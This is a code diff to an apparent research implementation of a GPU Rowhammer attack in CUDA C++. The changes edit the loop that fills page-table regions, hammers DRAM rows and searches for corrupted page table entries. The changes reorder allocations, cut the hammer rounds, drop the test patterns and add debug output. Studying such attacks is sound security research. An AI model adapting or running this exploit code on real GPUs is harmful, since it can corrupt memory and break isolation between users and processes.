@@ -12,6 +12,7 @@
 #include <string>
 #include <thread>
 #include <random>
+#include <cmath>
 
 void
 first_PT_region_attack_test (int argc, char *argv[])
@@ -112,13 +113,22 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
   /****************************************************************/
   /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
   /****************************************************************/
-  auto rng = std::default_random_engine {42};
   bool found_mismatch = false;
+  // unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
+  // std::mt19937_64 rng(seed); // Mersenne Twister engine
+
+  // // 2. Define the distribution for the desired range [x, y]
+  // std::uniform_int_distribution<int> dist(0, num_alloc_post_msg);
+
+  // // 3. Generate a random number
+  // int random_num = dist(rng);
   while (!found_mismatch)
     {
       // On Failure, Re-order and try again
       if (repeats != 0)
-        std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, rng);
+        std::rotate (region_ptrs, region_ptrs + num_alloc_post_msg - 8,
+                     region_ptrs + num_alloc_post_msg);
+        // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
       for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
         {
           if (repeats != 0)
@@ -130,9 +140,31 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
           region_ptrs[i] = temp;
 
-          // Create 64KB Pages to increase chances.
-          *temp = 'a';
+          if (repeats != 0 && i < 8000)
+            *region_ptrs[i] = 'a';
         }
+
+      // if (repeats == 0)
+      // {
+      //   std::rotate (region_ptrs, region_ptrs + num_alloc_post_msg - random_num,
+      //                region_ptrs + num_alloc_post_msg);
+      //   // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
+      //   for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
+      //   {
+      //     cudaFree (region_ptrs[i]);
+      //     cudaMallocManaged (&temp, ALLOC_SIZE);
+      //     double currentMS = time_data_access (temp, ALLOC_SIZE);
+      //     DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
+      //             << " ms" << std::endl;
+
+      //     region_ptrs[i] = temp;
+
+      //     if (i < 12000)
+      //       *region_ptrs[i] = 'a';
+      //   }
+      // }
+      // pause();
+
       gpuErrchk (cudaPeekAtLastError ());
       std::cout << "First PT Region Filled " << "Round " << repeats
                 << " Completed" << '\n';
@@ -141,10 +173,6 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
       std::cout << "Filling In Identifing Information for Each Page... "
                 << '\n';
-      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
-        memset_ptr<<<1, 31>>> (
-            region_ptrs[i] + 64 * 1024, ALLOC_SIZE - 64 * 1024);
-      cudaDeviceSynchronize ();
 
       std::cout << "Identifing Data Placed, Hammer Starts..." << '\n';
 
@@ -153,20 +181,18 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       const uint64_t k = 3;
       const uint64_t delay = 55;
       const uint64_t period = 1;
-      const uint64_t vic_pat = std::stoull ("0x55", nullptr, 16);
-      const uint64_t agg_pat = std::stoull ("0xAA", nullptr, 16);
 
-      for (int j = 0; j < 100; j++)
+      for (int j = 0; j < 50; j++)
         uint64_t time = start_multi_warp_hammer (
             agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
 
+      std::cout << "Hammer Done" << '\n';
       /**
        * For each 64KB, read from cuda. (Change util to write different data to
        * 64KB offset) Find repetition for temp and pair.
        *
        * If not repetition, find if it matches a PTE.
-       */
-      std::cout << "Hammer Done" << '\n';
+       */ 
       gpuErrchk (cudaPeekAtLastError ());
       for (uint64_t i = 0; !found_mismatch && i < num_alloc_post_msg; i += 1)
         {
@@ -187,6 +213,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
       if (found_mismatch)
         {
+          std::cout << "After " << repeats << " repeats"<< '\n';
           std::cout << "Corrupted: " << corrupt_id << ' '
                     << (void *)corrupted_addr
                     << ". Victim: " << (void *)victim_addr << '\n';
@@ -194,6 +221,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
         }
       else
         std::cout << "No Corruption Found, Retrying..." << "\n\n";
+      pause();
     }
 
   if (out_region_ptrs)
